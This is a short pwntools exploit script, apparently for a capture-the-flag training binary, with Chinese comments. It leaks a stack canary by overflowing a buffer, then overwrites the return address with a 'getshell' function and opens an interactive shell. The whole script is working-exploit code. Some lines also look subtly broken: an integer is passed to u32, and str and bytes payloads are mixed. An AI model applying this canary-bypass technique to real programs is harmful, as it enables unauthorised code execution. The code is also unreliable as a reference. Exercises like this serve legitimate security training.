from pwn import *

context.binary = 'ex2-x86'
# context.log_level = 'debug'
io = process('./ex2-x86')

get_shell = ELF("./ex2-x86").sym["getshell"] # 这里是得到getshell函数的起始地址

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\n' 对应的十六进制就是0xa

io.recvuntil("A"*100)
Canary = u32(int.from_bytes(io.recv(4),"little"))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = b"\x90"*100+p32(Canary)+b"\x90"*12+p32(get_shell) # 使用getshell的函数地址覆盖原来的返回地址
io.send(payload)

io.recv()

io.interactive()